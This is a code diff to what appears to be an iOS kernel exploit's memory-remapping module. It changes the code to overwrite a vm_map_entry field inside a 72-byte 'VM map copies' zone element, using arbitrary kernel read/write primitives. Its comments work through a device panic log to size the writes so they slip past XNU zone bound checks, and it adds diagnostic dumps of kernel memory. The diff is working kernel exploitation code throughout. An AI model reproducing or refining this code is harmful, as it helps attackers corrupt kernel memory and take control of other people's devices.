@@ -7,6 +7,8 @@
 
 #import <Foundation/Foundation.h>
 #import <pthread.h>
+#import <stddef.h>
+#import <string.h>
 #import "RemoteCall.h"
 #import "VM.h"
 #import "../../kexploit/krw.h"
@@ -18,6 +20,18 @@
 #define VM_PAGE_PACKED_PTR_SHIFT                        6
 #define VM_KERNEL_POINTER_SIGNIFICANT_BITS              38
 #define PAGE_MASK_K         (PAGE_SIZE - 1ULL)
+
+// Size of a "VM map copies" zone element, as reported by the kernel's own
+// bound check in the 2026-09-26 10:39 panic: "object ... of size 72".
+// Nothing may be written past nextAddr + 0x48.
+#define VME_ENTRY_ZONE_BYTES 0x48u
+
+// The only 32-byte block offset that both contains vme_object_or_delta and
+// stays inside a 0x48 element: [0x20, 0x40) <= 0x48.
+// offsetof() IS legal here: vme_object_or_delta is a plain union member, not a
+// bit-field. It measures 0x3c (the union starts at 0x38, after three uint32_t
+// ctx bit-fields), so the field ends exactly at 0x40.
+#define VME_BLOCK_HI 0x20u
 
 extern kern_return_t mach_vm_allocate(task_t task, mach_vm_address_t *addr, mach_vm_size_t size, int flags);
 extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t addr, mach_vm_size_t size);
@@ -268,8 +282,72 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
         return shmem;
     }
 
+    // -------------------------------------------------------------------------
+    // The "VM map copies" zone element at nextAddr is 72 (0x48) bytes.
+    //
+    // Proof from the device (panic 2026-09-26 10:39, incident B668A9A9,
+    // xnu-10063.122.3 on iPhone13,2 / 21F90):
+    //
+    //   panic(cpu 5 caller 0xfffffff02745c7b0): zone bound checks:
+    //   buffer 0xffffffdf028a8910 of length 32 overflows object
+    //   0xffffffdf028a88e0 of size 72 in zone 0xfffffff029304640[VM map copies]
+    //
+    //   0x8910 - 0x88e0 = 0x30, and 0x30 + 0x20 = 0x50 > 0x48  (overrun by 8)
+    //
+    // That is exactly kwrite_zone_element's third chunk for len == 80:
+    //   chunk 1  dst + 0x00   (32B)
+    //   chunk 2  dst + 0x20   (32B)
+    //   chunk 3  remaining 16 -> adjust 16 -> writeDst = 64 - 16 = dst + 0x30
+    //
+    // and sizeof(struct vm_map_entry) is 80 (0x50): links 32 + store 24 +
+    // union 8 + vme_alias/vme_offset 8 + bitfield 4 + counts 4.
+    //
+    // So the premise in the old comment here -- "vmc_entry is the FIRST MEMBER
+    // BY VALUE, so the vm_map_entry to patch lives AT the vm_map_copy address"
+    // -- is arithmetically impossible: an 80-byte entry cannot be a member of
+    // a 72-byte element. Writing sizeof(struct vm_map_entry) bytes is the bug.
+    //
+    // Hard constraint that follows: every primitive here writes 32 bytes.
+    // early_kwrite64() is implemented on top of early_kwrite32bytes()
+    // (kexploit/kexploit_opa334.m:502), so even an 8-byte store is widened to
+    // 32 and hits the same bound check. On a 72-byte element the only safe
+    // block offsets are 0x00 and 0x20 (0x20..0x40 <= 0x48). 0x40 would run to
+    // 0x60 and panic again.
+    // -------------------------------------------------------------------------
+
+    // Read only 0x48 bytes: that is the whole element. Reading past it is
+    // harmless for a zone bounds check but would pull in the next element and
+    // make the DIAG below lie.
     struct vm_map_entry entry = {0};
-    kreadbuf(nextAddr, &entry, sizeof(struct vm_map_entry));
+    kreadbuf(nextAddr, &entry, VME_ENTRY_ZONE_BYTES);
+
+    // DIAG via NSLog (3uTools realtime only captures NSLog, not printf):
+    // dump the real 72 bytes so the kernel's actual layout is measured on the
+    // device instead of inferred.
+    {
+        uint8_t raw[VME_ENTRY_ZONE_BYTES];
+        kreadbuf(nextAddr, raw, sizeof(raw));
+        // Plain C hex, not -appendFormat:- which is an NSMutableString category
+        // and is not visible under this SDK's module map.
+        static const char *hexdig = "0123456789abcdef";
+        char hexbuf[VME_ENTRY_ZONE_BYTES * 2 + 1];
+        for (int i = 0; i < (int)VME_ENTRY_ZONE_BYTES; i++) {
+            hexbuf[i * 2]     = hexdig[(raw[i] >> 4) & 0xF];
+            hexbuf[i * 2 + 1] = hexdig[raw[i] & 0xF];
+        }
+        hexbuf[VME_ENTRY_ZONE_BYTES * 2] = '\0';
+        NSLog(@"[DS] DIAG vmmapcopy nextAddr=0x%llx elemBytes=0x%lx sizeof(vm_map_entry)=0x%lx raw=%s",
+              (unsigned long long)nextAddr,
+              (unsigned long)VME_ENTRY_ZONE_BYTES,
+              (unsigned long)sizeof(struct vm_map_entry),
+              hexbuf);
+        NSLog(@"[DS] DIAG vme_object_or_delta@0x%lx=0x%08x is_sub_map=%d ko=%d wantObj=0x%llx wantOff=0x%llx",
+              (unsigned long)offsetof(struct vm_map_entry, vme_object_or_delta),
+              (unsigned)entry.vme_object_or_delta,
+              (int)entry.is_sub_map, (int)entry.vme_kernel_object,
+              (unsigned long long)object->address,
+              (unsigned long long)pageObjectOffset);
+    }
 
     if (entry.vme_kernel_object || entry.is_sub_map) {
         printf("[DS][%s:%d] REJECT submap/kernel-object: addr=0x%llx submap=%d ko=%d\n",
@@ -295,15 +373,53 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     kwrite32(object->address + off_vm_object_ref_count, refCount);
     BOOL bumpedRef = YES;
 
-    entry.vme_object_or_delta = (uint32_t)packedPointer;
-    // vme_offset is page-denominated, so convert the byte offset down. 31cfbe17
-    // removed this shift on the theory that the field holds bytes; the kernel
-    // panic on 2026-09-26 falsified that. See VME_OFFSET() above. This pair must
-    // stay symmetric with the read path or the remap selects a nonsense page.
-    entry.vme_offset = pageObjectOffset >> 12;
+    // PATCH GRANULARITY, NOT OFFSET. One variable changed this round: how many
+    // bytes go into the element. Offsets are untouched.
+    //
+    // vme_object_or_delta lives at 0x38, i.e. inside the 0x20..0x40 block, so
+    // it is the one field that can be written safely on a 72-byte element.
+    // vme_offset at 0x40 would need bytes 0x40..0x48 which is exactly the
+    // element end -- legal only for a sub-32-byte store, and we have no such
+    // primitive, so it is left alone and measured by the DIAG above instead.
+    //
+    // FALSIFIABLE PREDICTION
+    //   right: no panic; and if the DIAG prints vme_offset=0x0 then the
+    //          backing entry already pointed at page 0 of its object, the
+    //          hijack was purely the object pointer being wrong, and the
+    //          remap should now work (strlen returns the real length,
+    //          objc_getClass non-zero).
+    //   wrong: no panic but strlen still 0 -> the hijacked entry is not the one
+    //          XNU walks; the raw= dump plus vme_offset tells us where to go.
+    //   still panics: 0x48 is not the vm_map_copy size after all, and the
+    //          bound check is coming from a different writer entirely.
+    // Exclusive: concurrent writes raced XNU's non-sleepable RW lock -> panic
+    // "Taking non-sleepable RW lock with preemption enabled".
+    pthread_mutex_lock(&g_vmRemapLock);
 
-    // Exclusive: concurrent kwrite_zone_element raced XNU RW lock → panic.
-    kwrite_zone_element(nextAddr, &entry, sizeof(struct vm_map_entry));
+    // Read-modify-write of the single in-bounds block [0x20, 0x40). Everything
+    // outside vme_object_or_delta in that block is preserved byte for byte.
+    {
+        const uint64_t odOff = offsetof(struct vm_map_entry, vme_object_or_delta);
+        uint8_t blk[EARLY_KRW_LENGTH];
+        kreadbuf(nextAddr + VME_BLOCK_HI, blk, sizeof(blk));
+
+        const uint32_t newOD = (uint32_t)packedPointer;
+        memcpy(blk + (odOff - VME_BLOCK_HI), &newOD, sizeof(newOD));
+
+        early_kwrite32bytes(nextAddr + VME_BLOCK_HI, blk);
+
+        uint32_t check = 0;
+        kreadbuf(nextAddr + odOff, &check, sizeof(check));
+        NSLog(@"[DS] DIAG wrote vme_object_or_delta@0x%lx -> 0x%08x, readback 0x%08x %@",
+              (unsigned long)odOff, newOD, check,
+              check == newOD ? @"MATCH" : @"MISMATCH");
+    }
+
+    pthread_mutex_unlock(&g_vmRemapLock);
+
+    // vme_offset deliberately NOT written. pageObjectOffset stays logged by the
+    // DIAG above so the next run tells us whether it is non-zero, instead of
+    // us guessing its unit again.
 
     mach_vm_address_t mappedAddr = 0;
     vm_prot_t curProt = VM_PROT_ALL | VM_PROT_IS_MASK;
